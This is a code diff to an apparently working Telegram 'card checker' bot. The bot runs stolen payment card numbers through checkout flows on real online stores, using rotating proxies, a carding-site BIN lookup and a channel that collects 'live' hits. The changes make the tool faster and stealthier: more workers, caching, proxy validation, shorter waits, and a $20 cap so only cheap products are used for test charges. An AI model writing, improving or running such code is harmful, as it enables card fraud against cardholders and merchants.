@@ -38,7 +38,13 @@ HIT_CHANNEL = -1003805693108  # Channel for forwarding hits
 # Constants
 MAX_SITES_PER_USER = 500
 MAX_GLOBAL_SITES = 500
-WORKER_COUNT = 15
+MAX_SITE_PRODUCT_PRICE = 20.00
+WORKER_COUNT = int(os.getenv("WORKER_COUNT", "30"))
+PROXY_VALIDATION_URL = "https://httpbin.org/ip"
+PROXY_VALIDATION_TIMEOUT = 6
+PROXY_VALIDATION_CONCURRENCY = 25
+PRODUCT_CACHE_TTL_SECONDS = 300
+BIN_CACHE_TTL_SECONDS = 86400
 
 # Logging setup
 logging.basicConfig(
@@ -68,6 +74,8 @@ active_tasks = {}  # task_id -> task info
 task_stats = {}    # message_id -> task stats
 task_messages = {} # message_id -> message object
 task_users = {}    # message_id -> user_id
+product_cache = {} # normalized_site -> {"data": product_info, "expires_at": epoch}
+bin_cache = {}     # bin -> {"data": bin_info, "expires_at": epoch}
 
 # Global queues
 TASK_QUEUE = asyncio.Queue()
@@ -221,17 +229,103 @@ class Utils:
 def parse_proxy(proxy_str):
     if not proxy_str:
         return None
-    
+
+    proxy_str = proxy_str.strip()
+
+    if proxy_str.startswith(("http://", "https://")):
+        parsed = urlparse(proxy_str)
+        if not parsed.hostname or not parsed.port:
+            return None
+        if parsed.username and parsed.password:
+            return f"http://{parsed.username}:{parsed.password}@{parsed.hostname}:{parsed.port}"
+        return f"http://{parsed.hostname}:{parsed.port}"
+
     parts = proxy_str.split(':')
-    
     if len(parts) == 2:
-        ip, port = parts
-        return f"http://{ip}:{port}"
-    elif len(parts) == 4:
-        ip, port, user, password = parts
-        return f"http://{user}:{password}@{ip}:{port}"
-    else:
-        return None
+        host, port = parts
+        return f"http://{host}:{port}"
+    if len(parts) == 4:
+        host, port, user, password = parts
+        return f"http://{user}:{password}@{host}:{port}"
+    return None
+
+def normalize_site_url(site_url):
+    """Normalize site URL to scheme+host for stable storage/cache keys."""
+    if not site_url:
+        return site_url
+    normalized = str(site_url).strip()
+    if not normalized.startswith(('http://', 'https://')):
+        normalized = f"https://{normalized}"
+    parsed = urlparse(normalized)
+    if not parsed.netloc:
+        return normalized.rstrip('/')
+    return f"{parsed.scheme or 'https'}://{parsed.netloc.lower()}".rstrip('/')
+
+def validate_proxy_format(proxy_str):
+    """Validate and normalize proxy format for storage."""
+    if not proxy_str:
+        return False, None, "Empty proxy"
+
+    proxy_raw = str(proxy_str).strip()
+    host = ""
+    port = None
+    username = None
+    password = None
+
+    try:
+        if proxy_raw.startswith(("http://", "https://")):
+            parsed = urlparse(proxy_raw)
+            host = parsed.hostname or ""
+            port = parsed.port
+            username = parsed.username
+            password = parsed.password
+        else:
+            parts = proxy_raw.split(':')
+            if len(parts) == 2:
+                host, port = parts[0].strip(), parts[1].strip()
+            elif len(parts) == 4:
+                host, port, username, password = [p.strip() for p in parts]
+            else:
+                return False, None, "Expected IP:PORT or IP:PORT:USER:PASS"
+
+        if not host:
+            return False, None, "Missing proxy host"
+
+        if isinstance(port, str):
+            if not port.isdigit():
+                return False, None, "Invalid port"
+            port = int(port)
+        if not isinstance(port, int) or port < 1 or port > 65535:
+            return False, None, "Port must be between 1 and 65535"
+
+        if (username and not password) or (password and not username):
+            return False, None, "Both username and password are required"
+
+        if username and password:
+            normalized = f"{host}:{port}:{username}:{password}"
+        else:
+            normalized = f"{host}:{port}"
+
+        return True, normalized, None
+    except Exception:
+        return False, None, "Invalid proxy format"
+
+async def validate_proxy_connection(proxy_str):
+    """Validate that a proxy is reachable."""
+    proxy = parse_proxy(proxy_str)
+    if not proxy:
+        return False, "Invalid proxy format"
+
+    connector = aiohttp.TCPConnector(ssl=False)
+    timeout = aiohttp.ClientTimeout(total=PROXY_VALIDATION_TIMEOUT)
+    try:
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            async with session.get(PROXY_VALIDATION_URL, proxy=proxy) as resp:
+                if resp.status == 200:
+                    return True, "OK"
+                return False, f"HTTP {resp.status}"
+    except Exception as e:
+        return False, f"Unreachable ({type(e).__name__})"
 
 def is_captcha_required(response_text):
     if not response_text:
@@ -275,8 +369,13 @@ async def make_graphql_request_with_captcha_handling(
 
 async def fetch_products(domain, proxy_str=None):
     try:
-        if not domain.startswith('http'):
-            domain = "https://" + domain
+        domain = normalize_site_url(domain)
+
+        cache_key = domain.lower()
+        cached_product = product_cache.get(cache_key)
+        now_ts = time.time()
+        if cached_product and cached_product.get("expires_at", 0) > now_ts:
+            return dict(cached_product["data"])
         
         connector = aiohttp.TCPConnector(ssl=False)
         timeout = aiohttp.ClientTimeout(total=10)
@@ -325,6 +424,10 @@ async def fetch_products(domain, proxy_str=None):
                     continue
         
         if isinstance(min_product, dict) and min_product.get('variant_id'):
+            product_cache[cache_key] = {
+                "data": min_product,
+                "expires_at": now_ts + PRODUCT_CACHE_TTL_SECONDS
+            }
             return min_product
         else:
             return False, "No Valid Products"
@@ -378,15 +481,7 @@ def parse_cc_string(cc_string):
         'cvv': parts[3].strip()
     }
 
-def get_bin_info(bin_number):
-    """Get BIN information from antipublic API"""
-    try:
-        import requests
-        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
-        if response.status_code == 200:
-            return response.json()
-    except:
-        pass
+def get_default_bin_info(bin_number):
     return {
         "bin": bin_number,
         "brand": "UNKNOWN",
@@ -396,6 +491,49 @@ def get_bin_info(bin_number):
         "bank": "UNKNOWN",
         "level": "UNKNOWN",
         "type": "UNKNOWN"
+    }
+
+async def get_bin_info(bin_number):
+    """Get BIN information asynchronously with cache."""
+    now_ts = time.time()
+    cached = bin_cache.get(bin_number)
+    if cached and cached.get("expires_at", 0) > now_ts:
+        return cached["data"]
+
+    try:
+        timeout = aiohttp.ClientTimeout(total=5)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
+                if response.status == 200:
+                    data = await response.json()
+                    bin_cache[bin_number] = {
+                        "data": data,
+                        "expires_at": now_ts + BIN_CACHE_TTL_SECONDS
+                    }
+                    return data
+    except Exception:
+        pass
+    fallback = get_default_bin_info(bin_number)
+    bin_cache[bin_number] = {
+        "data": fallback,
+        "expires_at": now_ts + BIN_CACHE_TTL_SECONDS
+    }
+    return fallback
+
+def get_active_task_stats(user_id):
+    queued = 0
+    processing = 0
+    for task in active_tasks.values():
+        if task.get('user_id') != user_id:
+            continue
+        if task.get('status') == 'processing':
+            processing += 1
+        else:
+            queued += 1
+    return {
+        "active_total": queued + processing,
+        "active_queued": queued,
+        "active_processing": processing
     }
 
 async def test_site_connection(site_url, proxy_str=None):
@@ -467,14 +605,13 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
     receipt_id = None
     order_url = None
     
-    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
+    ourl = normalize_site_url(site_url)
     displayName = ""
     payment_identifier = None
     proxy = parse_proxy(proxy_str) if proxy_str else None
     checkpoint_data = None
     running_total = "0.00"
     max_retries = 1  # Retry once with new proxy if connection fails
-    original_proxy = proxy
 
     for attempt in range(max_retries + 1):
         try:
@@ -685,12 +822,9 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
 
                 graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
                 
-                for i in range(2):
-                    response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                        session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
-                    )
-                    if i == 0:
-                        await asyncio.sleep(3)
+                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
+                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
+                )
                 
                 if not response:
                     # Connection failed, try new proxy if available
@@ -1084,7 +1218,7 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                     'operationName': 'PollForReceipt'
                 }
 
-                await asyncio.sleep(3)
+                await asyncio.sleep(1.5)
                 
                 receipt_resp_json = None
                 final_text = ""
@@ -1122,14 +1256,14 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                                 return True, code, gateway, total_price, currency, receipt_id, order_url
 
                             if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
-                                await asyncio.sleep(4)
+                                await asyncio.sleep(2)
                                 continue
                             
                     except Exception as e:
                         pass
                     
                     if 'WaitingReceipt' in final_text:
-                        await asyncio.sleep(4)
+                        await asyncio.sleep(2)
                     else:
                         break
                 
@@ -1172,6 +1306,15 @@ async def remove_dead_site(user_id, site_url):
 async def save_working_site(user_id, site_url, product_info):
     """Save working site with product info to user's sites"""
     try:
+        site_url = normalize_site_url(site_url)
+        try:
+            product_price = float(str(product_info.get('price', '0')).replace(',', '').strip())
+        except Exception:
+            return False, "Invalid product price"
+
+        if product_price > MAX_SITE_PRODUCT_PRICE:
+            return False, f"Cheapest product ${product_price:.2f} is above ${MAX_SITE_PRODUCT_PRICE:.2f}"
+
         # Check if user already has max sites
         user_sites_doc = await user_sites_col.find_one({'user_id': user_id})
         current_count = len(user_sites_doc.get('sites', [])) if user_sites_doc else 0
@@ -1188,7 +1331,7 @@ async def save_working_site(user_id, site_url, product_info):
         # Add site
         site_entry = {
             'url': site_url,
-            'price': product_info.get('price', '0'),
+            'price': f"{product_price:.2f}",
             'variant_id': product_info.get('variant_id'),
             'product_link': product_info.get('link'),
             'last_checked': datetime.utcnow()
@@ -1282,6 +1425,15 @@ async def task_worker(worker_id):
             message = task['message']
             task_type = task['type']
             task_id = task.get('task_id')
+            if task_id:
+                active_tasks[task_id] = {
+                    'user_id': user_id,
+                    'task_type': task_type,
+                    'status': 'processing',
+                    'site': site,
+                    'started_at': datetime.utcnow(),
+                    'worker_id': worker_id
+                }
             
             # Process the card
             start_time = time.time()
@@ -1293,7 +1445,7 @@ async def task_worker(worker_id):
             
             # Get BIN info
             bin_number = cc_data['cc'][:6]
-            bin_info = get_bin_info(bin_number)
+            bin_info = await get_bin_info(bin_number)
             
             # Prepare result
             result = {
@@ -1322,6 +1474,8 @@ async def task_worker(worker_id):
             
         except Exception as e:
             logger.error(f"Worker {worker_id} error: {e}")
+            if 'task_id' in locals() and task_id:
+                active_tasks.pop(task_id, None)
             TASK_QUEUE.task_done()
 
 # Result handler
@@ -1423,7 +1577,7 @@ by @still_alivenow"""
                         disable_web_page_preview=True
                     )
                     if HIT_CHANNEL and hit_status in ['hit', 'live']:
-                        time.sleep(0.3)
+                        await asyncio.sleep(0.3)
                         await app.send_message(
                             chat_id=HIT_CHANNEL,
                             text=formatted_message,
@@ -1444,7 +1598,7 @@ by @still_alivenow"""
                             disable_web_page_preview=True
                         )
                         if HIT_CHANNEL and hit_status in ['hit', 'live']:
-                            time.sleep(0.3)
+                            await asyncio.sleep(0.3)
                             await app.send_message(
                                 chat_id=HIT_CHANNEL,
                                 text=formatted_message,
@@ -1495,11 +1649,16 @@ by @still_alivenow"""
                             
                 except Exception as e:
                     logger.error(f"Error updating progress: {e}")
+
+            if task_id:
+                active_tasks.pop(task_id, None)
             
             RESULT_QUEUE.task_done()
             
         except Exception as e:
             logger.error(f"Result handler error: {e}")
+            if 'task_id' in locals() and task_id:
+                active_tasks.pop(task_id, None)
             RESULT_QUEUE.task_done()
 
 async def cleanup_task_data(msg_id, delay=300):
@@ -1670,6 +1829,7 @@ async def get_user_stats(user_id):
     
     proxy_count = await proxies_col.count_documents({'user_id': user_id})
     sites_count = len(await get_user_sites(user_id))
+    active_task_stats = get_active_task_stats(user_id)
     
     return {
         'user_id': user_id,
@@ -1679,7 +1839,10 @@ async def get_user_stats(user_id):
         'last_seen': user.get('last_seen'),
         'total_checks': user.get('total_checks', 0),
         'proxy_count': proxy_count,
-        'sites_count': sites_count
+        'sites_count': sites_count,
+        'active_tasks': active_task_stats['active_total'],
+        'active_queued': active_task_stats['active_queued'],
+        'active_processing': active_task_stats['active_processing']
     }
 
 # Bot commands
@@ -1767,6 +1930,13 @@ async def chk_command(client, message):
     
     # Generate task ID
     task_id = f"{user.id}_{int(time.time())}_{random.randint(1000, 9999)}"
+    active_tasks[task_id] = {
+        'user_id': user.id,
+        'task_type': 'single',
+        'status': 'queued',
+        'site': site,
+        'created_at': datetime.utcnow()
+    }
     
     # Add to task queue
     await TASK_QUEUE.put({
@@ -1888,6 +2058,13 @@ CREATED BY @still_alivenow"""
         proxy = random.choice(user_proxies) if user_proxies else None
         site = sites[i]
         task_id = f"{user.id}_{int(time.time())}_{i}"
+        active_tasks[task_id] = {
+            'user_id': user.id,
+            'task_type': 'mchk',
+            'status': 'queued',
+            'site': site,
+            'created_at': datetime.utcnow()
+        }
         
         await TASK_QUEUE.put({
             'user_id': user.id,
@@ -1984,6 +2161,7 @@ CREATED BY @still_alivenow"""
     
     # Test sites
     working_sites = []
+    skipped_sites = []
     dead_sites = []
     
     for i, site in enumerate(sites):
@@ -1991,10 +2169,13 @@ CREATED BY @still_alivenow"""
         is_working, message_text, product_info = await test_site_connection(site, proxy)
         
         if is_working:
-            working_sites.append((site, product_info))
-            # Save working site
-            await save_working_site(user.id, site, product_info)
-            hit_status = "hit"
+            saved, save_msg = await save_working_site(user.id, site, product_info)
+            if saved:
+                working_sites.append((site, product_info))
+                hit_status = "hit"
+            else:
+                skipped_sites.append((site, product_info, save_msg))
+                hit_status = "failed"
         else:
             dead_sites.append((site, message_text))
             hit_status = "failed"
@@ -2017,6 +2198,12 @@ CREATED BY @still_alivenow"""
             await f.write(f"{site}\n")
             await f.write(f"  Price: ${info['price']}\n")
             await f.write(f"  Product: {info['link']}\n\n")
+
+        await f.write("\n=== SKIPPED SITES (PRICE LIMIT) ===\n\n")
+        for site, info, reason in skipped_sites:
+            await f.write(f"{site}\n")
+            await f.write(f"  Price: ${info.get('price', 'N/A')}\n")
+            await f.write(f"  Reason: {reason}\n\n")
         
         await f.write("\n=== DEAD SITES ===\n\n")
         for site, error in dead_sites:
@@ -2026,10 +2213,11 @@ CREATED BY @still_alivenow"""
     summary = f"""✅ Site Test Complete!
 
 📊 Results:
-🟢 Working: {len(working_sites)}
+🟢 Added: {len(working_sites)}
+🟡 Skipped (> ${MAX_SITE_PRODUCT_PRICE:.2f}): {len(skipped_sites)}
 🔴 Dead: {len(dead_sites)}
 
-Working sites have been added to your list.
+Only sites under ${MAX_SITE_PRODUCT_PRICE:.2f} were added.
 Check /showsites to see them."""
     
     await message.reply_document(
@@ -2071,21 +2259,66 @@ async def addproxy_command(client, message):
         )
         return
     
-    # Add proxies
-    added = 0
-    failed = 0
-    for proxy in proxies:
-        if await add_user_proxy(user.id, proxy):
-            added += 1
-        else:
-            failed += 1
-    
-    await message.reply_text(
-        f"✅ Proxies added!\n"
-        f"📊 Added: {added}\n"
-        f"❌ Failed: {failed}",
+    status_msg = await message.reply_text(
+        f"🔄 Validating {len(proxies)} proxies...",
         disable_web_page_preview=True
     )
+
+    normalized_proxies = []
+    invalid_proxies = []
+    seen = set()
+    for proxy in proxies:
+        is_valid, normalized_proxy, reason = validate_proxy_format(proxy)
+        if not is_valid:
+            invalid_proxies.append((proxy, reason))
+            continue
+        if normalized_proxy in seen:
+            continue
+        seen.add(normalized_proxy)
+        normalized_proxies.append(normalized_proxy)
+
+    if not normalized_proxies:
+        await status_msg.edit_text(
+            f"❌ No valid proxies found.\n"
+            f"Invalid format: {len(invalid_proxies)}",
+            disable_web_page_preview=True
+        )
+        return
+
+    semaphore = asyncio.Semaphore(PROXY_VALIDATION_CONCURRENCY)
+
+    async def _validate_one(proxy_value):
+        async with semaphore:
+            ok, reason = await validate_proxy_connection(proxy_value)
+            return proxy_value, ok, reason
+
+    proxy_checks = await asyncio.gather(*[_validate_one(proxy_value) for proxy_value in normalized_proxies])
+
+    added = 0
+    db_failed = 0
+    unreachable = []
+    for proxy_value, ok, reason in proxy_checks:
+        if not ok:
+            unreachable.append((proxy_value, reason))
+            continue
+        if await add_user_proxy(user.id, proxy_value):
+            added += 1
+        else:
+            db_failed += 1
+
+    details = [
+        "✅ Proxy validation complete!",
+        f"📊 Added: {added}",
+        f"❌ Invalid format: {len(invalid_proxies)}",
+        f"❌ Unreachable: {len(unreachable)}",
+        f"❌ DB failed: {db_failed}"
+    ]
+    if invalid_proxies:
+        details.append(f"⚠️ Invalid sample: {invalid_proxies[0][0]} ({invalid_proxies[0][1]})")
+    if unreachable:
+        details.append(f"⚠️ Unreachable sample: {unreachable[0][0]} ({unreachable[0][1]})")
+
+    await status_msg.edit_text("\n".join(details), disable_web_page_preview=True)
 
 @app.on_message(filters.command('delproxy') & filters.private)
 async def delproxy_command(client, message):
@@ -2159,7 +2392,7 @@ async def addsite_command(client, message):
         await processing_msg.edit_text(f"❌ {info[1]}", disable_web_page_preview=True)
         return
     
-    # Save working site
+    # Save working site (only if cheapest product <= price limit)
     success, msg = await save_working_site(user.id, site, info)
     
     if success:
@@ -2407,7 +2640,8 @@ async def stats_command(client, message):
 👀 Last Seen: {last_seen}
 🔢 Total Checks: {stats['total_checks']}
 🔌 Proxies: {stats['proxy_count']}
-🌐 Working Sites: {stats['sites_count']}"""
+🌐 Working Sites: {stats['sites_count']}
+⚡ Active Tasks: {stats['active_tasks']} (Queued: {stats['active_queued']} | Processing: {stats['active_processing']})"""
 
     await message.reply_text(stats_text, disable_web_page_preview=True)
 
